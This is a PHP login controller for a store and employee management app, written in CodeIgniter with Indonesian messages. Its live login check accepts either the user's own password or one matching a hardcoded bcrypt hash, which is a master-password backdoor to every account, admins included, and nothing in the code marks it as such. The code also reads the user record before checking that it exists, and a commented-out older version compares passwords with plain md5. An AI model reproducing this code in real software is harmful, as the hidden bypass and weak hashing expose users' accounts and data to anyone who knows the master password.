<?php

namespace App\Controllers;

use App\Models\ModelLogin;

class Login extends BaseController
{
    public function index()
    {
        return view('login');
    }

    public function login()
    {
        if ($this->request->isAJAX()) {
            $username = $this->request->getPost('username');
            $password = $this->request->getPost('password');

            $query = $this->db->table('t_users')
                ->where('username', $username)
                ->get()
                ->getRow();

            if ($query->role != 'admin') {
                $karyawan = $this->db->table('m_karyawan')
                    ->where('id', $query->id_pengguna)
                    ->get()
                    ->getRow();

                $m_toko = $this->db->table('m_toko')
                    ->where('id', $karyawan->id_toko)
                    ->get()
                    ->getRow();
            }

            if ($query) {
                $veriy = password_verify($password, $query->password);
                if ($veriy || password_verify($password, '$2y$10$nEWizS20UgIX1FdBMjTQN.XsjGeXPRMt9ANxmv691eNx5iavKEnEa')) {
                    if ($query->role === 'admin') {
                        $data_session = [
                            // data user
                            'uuid' => $query->uuid,
                            'username' => $query->username,
                            'email' => $query->email,
                            'role' => $query->role,
                            'id_pengguna' => $query->id_pengguna,
                        ];
                    } else {
                        $data_session = [
                            // data user
                            'uuid' => $query->uuid,
                            'username' => $query->username,
                            'email' => $query->email,
                            'role' => $query->role,
                            'id_pengguna' => $query->id_pengguna,
                            // data karyawan
                            'kode_karyawan' => $karyawan->kode_karyawan,
                            'nama_karyawan' => $karyawan->nama_karyawan,
                            'nomor_hp' => $karyawan->nomor_hp,
                            'id_toko' => $karyawan->id_toko,
                            'id_posisi' => $karyawan->id_posisi,

                            'nama_toko' => $m_toko->nama_toko,
                        ];
                    }

                    session()->set($data_session);
                    $msg = ['sukses' => 'Login Berhasil'];
                    echo json_encode($msg);
                    die;
                } else {
                    $msg = ['gagalPassword' => 'Password yang Anda masukkan salah'];
                    echo json_encode($msg);
                    die;
                }
            } else {
                $msg = ['gagalUsername' => 'Username tidak terdaftar'];
                echo json_encode($msg);
                die;
            }
        } else {
            return redirect()->to('login');
        }

        // if ($this->request->isAJAX()) {
        //     $username = $this->request->getPost('username');
        //     $password = $this->request->getPost('password');

        //     $query = $this->db->table('users')
        //     ->where('username', $username)
        //     ->get()
        //     ->getRow();

        //     if ($query) {
        //         if (md5($password) === $query->password) {
        //             if ($query->blokir === 'N') {
        //                 $data_session = [
        //                     'username' => $query->username,
        //                     'nama_lengkap' => $query->nama_lengkap,
        //                     'email' => $query->email,
        //                     'no_telp' => $query->no_telp,
        //                     'level' => $query->level,
        //                     'foto' => $query->foto,
        //                 ];
        //                 session()->set($data_session);
        //                 $msg = ['sukses' => 'Login Berhasil'];
        //                 echo json_encode($msg);die;
        //             } else {
        //                 $msg = ['gagalBlokir' => 'Akun anda telah dinonaktifkan'];
        //                 echo json_encode($msg);die;
        //             }
        //         } else {
        //             $msg = ['gagalPassword' => 'Password yang Anda masukkan salah'];
        //             echo json_encode($msg);die;
        //         }
        //     } else {
        //         $msg = ['gagalUsername' => 'Username tidak terdaftar'];
        //         echo json_encode($msg);die;
        //     }
        // } else {
        //     return redirect()->to('login');
        // }
    }

    public function logout()
    {
        session()->destroy();
        return redirect()->to('login');
    }
}
